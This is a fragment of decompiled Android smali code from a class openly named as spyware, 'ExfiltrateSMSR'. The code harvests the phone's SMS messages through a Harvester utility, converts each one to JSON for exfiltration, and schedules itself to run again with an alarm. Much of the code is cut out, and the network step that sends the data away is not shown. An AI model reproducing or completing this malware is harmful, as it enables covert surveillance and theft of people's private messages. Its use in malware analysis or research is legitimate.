.class public Landroid/spyware/receivers/ExfiltrateSMSR;
.super Landroid/content/BroadcastReceiver;
.source "ExfiltrateSMSR.java"
...
.method private setAlarm(Landroid/content/Context;)V
    ...
    const-class v4, Landroid/spyware/receivers/ExfiltrateSMSR;
...
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    ...
    invoke-virtual {v3}, Landroid/spyware/utils/Harvester;->getSMSArray()Ljava/util/List;
    ...
    .line 51
    .local v2, "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/model/SMS;>;"
    if-eqz v2, :cond_63
    ...
    .line 54
    .local v0, "JSONArraySMS":Lorg/json/JSONArray;
    ...
    check-cast v1, Landroid/spyware/model/SMS;

    .local v1, "SMS":Landroid/spyware/model/SMS;
    invoke-virtual {v1}, Landroid/spyware/model/SMS;->toJSON()Lorg/json/JSONObject;
    ...
    .line 56
    .end local v1    # "SMS":Landroid/spyware/model/SMS;
    :cond_4e
    ...
    .line 62
    .end local v0    # "JSONArraySMS":Lorg/json/JSONArray;
    ...
    :cond_63
    invoke-direct {v9, v10}, Landroid/spyware/receivers/ExfiltrateSMSR;->setAlarm(Landroid/content/Context;)V
